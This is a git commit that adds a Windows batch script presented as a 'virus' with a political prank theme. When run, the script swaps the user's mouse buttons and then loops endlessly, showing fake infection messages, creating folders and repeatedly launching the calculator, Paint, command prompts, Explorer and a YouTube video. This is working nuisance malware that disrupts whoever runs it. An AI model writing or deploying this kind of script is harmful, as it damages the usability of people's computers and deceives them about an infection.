0e2e392525e1e57d4abc40106795121c04f148f1
zRamons <ramomsouza07@gmail.com>
2023-08-15 13:05:57 -0300

    Projeto miguel e projeto bb

---
+++ virus bolsonaro/python/Bolsonaro.bat
@@ -0,0 +1,21 @@
+@echo off
+
+Rundll32 User32 , SwapMouseButton
+
+:loop
+
+msg Você está sendo infectado pelo vírus BOLSONARO
+msg BOLSONARO
+
+md virus
+md hack
+md infectado
+md %random%
+
+start calc
+start mspaint
+start cmd
+start explorer
+start https://www.youtube.com/watch?v=r8j6gT1E6W4&pp=ygUPMjIgw6kgYm9sc29uYXJv
+
+goto :loop
